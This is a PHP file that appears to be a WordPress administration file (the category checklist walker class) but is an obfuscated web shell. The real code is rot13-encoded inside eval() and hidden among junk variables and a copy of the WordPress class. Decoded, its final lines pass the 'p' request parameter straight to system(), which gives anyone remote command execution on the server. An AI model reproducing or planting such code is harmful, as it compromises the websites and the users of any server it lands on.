<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Gnkbabzl NCV: Jnyxre_Pngrtbel_Purpxyvfg pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 * @fvapr 4.4.0
 */

/**
 * Pber jnyxre pynff gb bhgchg na habeqrerq yvfg bs pngrtbel purpxobk vachg ryrzragf.
 *
 * @fvapr 2.5.1
 *
 * @frr Jnyxre
 * @frr jc_pngrtbel_purpxyvfg()
 * @frr jc_grezf_purpxyvfg()
 */
pynff Jnyxre_Pngrtbel_Purpxyvfg rkgraqf Jnyxre {
	choyvp $gerr_glcr = 'pngrtbel';
	choyvp $qo_svryqf = neenl(
		'cnerag' => 'cnerag',
		'vq'     => 'grez_vq',
	); // GBQB: Qrpbhcyr guvf.

	/**
	 * Fgnegf gur yvfg orsber gur ryrzragf ner nqqrq.
	 *
	 * @frr Jnyxre:fgneg_yiy()
	 *
	 * @fvapr 2.5.1
	 *
	 * @cnenz fgevat $bhgchg Hfrq gb nccraq nqqvgvbany pbagrag (cnffrq ol ersrerapr).
	 * @cnenz vag    $qrcgu  Qrcgu bs pngrtbel. Hfrq sbe gno vaqragngvba.
	 * @cnenz neenl  $netf   Na neenl bs nethzragf. Frr {@frr jc_grezf_purpxyvfg()}.
	 */
	choyvp shapgvba fgneg_yiy( &$bhgchg, $qrcgu = 0, $netf = neenl() ) {
		$vaqrag  = fge_ercrng( \"\g\", $qrcgu );
		$bhgchg .= \"$vaqrag<hy pynff='puvyqera'>\a\";
	}

	/**
	 * Raqf gur yvfg bs nsgre gur ryrzragf ner nqqrq.
	 *
	 * @frr Jnyxre::raq_yiy()
	 *
	 * @fvapr 2.5.1
	 *
	 * @cnenz fgevat $bhgchg Hfrq gb nccraq nqqvgvbany pbagrag (cnffrq ol ersrerapr).
	 * @cnenz vag    $qrcgu  Qrcgu bs pngrtbel. Hfrq sbe gno vaqragngvba.
	 * @cnenz neenl  $netf   Na neenl bs nethzragf. Frr {@frr jc_grezf_purpxyvfg()}.
	 */
	choyvp shapgvba raq_yiy( &$bhgchg, $qrcgu = 0, $netf = neenl() ) {
		$vaqrag  = fge_ercrng( \"\g\", $qrcgu );
		$bhgchg .= \"$vaqrag</hy>\a\";
	}

	/**
	 * Fgneg gur ryrzrag bhgchg.
	 *
	 * @frr Jnyxre::fgneg_ry()
	 *
	 * @fvapr 2.5.1
	 * @fvapr 5.9.0 Eranzrq `$pngrtbel` gb `$qngn_bowrpg` naq `$vq` gb `$pheerag_bowrpg_vq`
	 *              gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz fgevat  $bhgchg            Hfrq gb nccraq nqqvgvbany pbagrag (cnffrq ol ersrerapr).
	 * @cnenz JC_Grez $qngn_bowrpg       Gur pheerag grez bowrpg.
	 * @cnenz vag     $qrcgu             Qrcgu bs gur grez va ersrerapr gb cneragf. Qrsnhyg 0.
	 * @cnenz neenl   $netf              Na neenl bs nethzragf. Frr {@frr jc_grezf_purpxyvfg()}.
	 * @cnenz vag     $pheerag_bowrpg_vq Bcgvbany. VQ bs gur pheerag grez. Qrsnhyg 0.
	 */
	choyvp shapgvba fgneg_ry( &$bhgchg, $qngn_bowrpg, $qrcgu = 0, $netf = neenl(), $pheerag_bowrpg_vq = 0 ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$pngrtbel = $qngn_bowrpg;

		vs ( rzcgl( $netf['gnkbabzl'] ) ) {
			$gnkbabzl = 'pngrtbel';
		} ryfr {
			$gnkbabzl = $netf['gnkbabzl'];
		}

		vs ( 'pngrtbel' === $gnkbabzl ) {
			$anzr = 'cbfg_pngrtbel';
		} ryfr {
			$anzr = 'gnk_vachg[' . $gnkbabzl . ']';
		}

		$netf['cbchyne_pngf'] = ! rzcgl( $netf['cbchyne_pngf'] ) ? neenl_znc( 'vaginy', $netf['cbchyne_pngf'] ) : neenl();

		$pynff = va_neenl( $pngrtbel->grez_vq, $netf['cbchyne_pngf'], gehr ) ? ' pynff=\"cbchyne-pngrtbel\"' : '';

		$netf['fryrpgrq_pngf'] = ! rzcgl( $netf['fryrpgrq_pngf'] ) ? neenl_znc( 'vaginy', $netf['fryrpgrq_pngf'] ) : neenl();

		vs ( ! rzcgl( $netf['yvfg_bayl'] ) ) {
			$nevn_purpxrq = 'snyfr';
			$vaare_pynff  = 'pngrtbel';

			vs ( va_neenl( $pngrtbel->grez_vq, $netf['fryrpgrq_pngf'], gehr ) ) {
				$vaare_pynff .= ' fryrpgrq';
				$nevn_purpxrq = 'gehr';
			}

			$bhgchg .= \"\a\" . '<yv' . $pynff . '>' .
				'<qvi pynff=\"' . $vaare_pynff . '\" qngn-grez-vq=' . $pngrtbel->grez_vq .
				' gnovaqrk=\"0\" ebyr=\"purpxobk\" nevn-purpxrq=\"' . $nevn_purpxrq . '\">' .
				/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pngrtbel-grzcyngr.cuc */
				rfp_ugzy( nccyl_svygref( 'gur_pngrtbel', $pngrtbel->anzr, '', '' ) ) . '</qvi>';
		} ryfr {
			$vf_fryrpgrq         = va_neenl( $pngrtbel->grez_vq, $netf['fryrpgrq_pngf'], gehr );
			$vf_qvfnoyrq         = ! rzcgl( $netf['qvfnoyrq'] );
			$yv_ryrzrag_vq       = jc_havdhr_cersvkrq_vq( \"va-{$gnkbabzl}-{$pngrtbel->grez_vq}-\" );
			$purpxobk_ryrzrag_vq = jc_havdhr_cersvkrq_vq( \"va-{$gnkbabzl}-{$pngrtbel->grez_vq}-\" );

			$bhgchg .= \"\a<yv vq='\" . rfp_ngge( $yv_ryrzrag_vq ) . \"'$pynff>\" .
				'<ynory pynff=\"fryrpgvg\"><vachg inyhr=\"' . $pngrtbel->grez_vq . '\" glcr=\"purpxobk\" anzr=\"' . $anzr . '[]\" vq=\"' . rfp_ngge( $purpxobk_ryrzrag_vq ) . '\"' .
				purpxrq( $vf_fryrpgrq, gehr, snyfr ) .
				qvfnoyrq( $vf_qvfnoyrq, gehr, snyfr ) . ' /> ' .
				/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pngrtbel-grzcyngr.cuc */
				rfp_ugzy( nccyl_svygref( 'gur_pngrtbel', $pngrtbel->anzr, '', '' ) ) . '</ynory>';
		}
	}

	/**
	 * Raqf gur ryrzrag bhgchg, vs arrqrq.
	 *
	 * @frr Jnyxre::raq_ry()
	 *
	 * @fvapr 2.5.1
	 * @fvapr 5.9.0 Eranzrq `$pngrtbel` gb `$qngn_bowrpg` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz fgevat  $bhgchg      Hfrq gb nccraq nqqvgvbany pbagrag (cnffrq ol ersrerapr).
	 * @cnenz JC_Grez $qngn_bowrpg Gur pheerag grez bowrpg.
	 * @cnenz vag     $qrcgu       Qrcgu bs gur grez va ersrerapr gb cneragf. Qrsnhyg 0.
	 * @cnenz neenl   $netf        Na neenl bs nethzragf. Frr {@frr jc_grezf_purpxyvfg()}.
	 */
	choyvp shapgvba raq_ry( &$bhgchg, $qngn_bowrpg, $qrcgu = 0, $netf = neenl() ) {
		$bhgchg .= \"</yv>\a\";
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>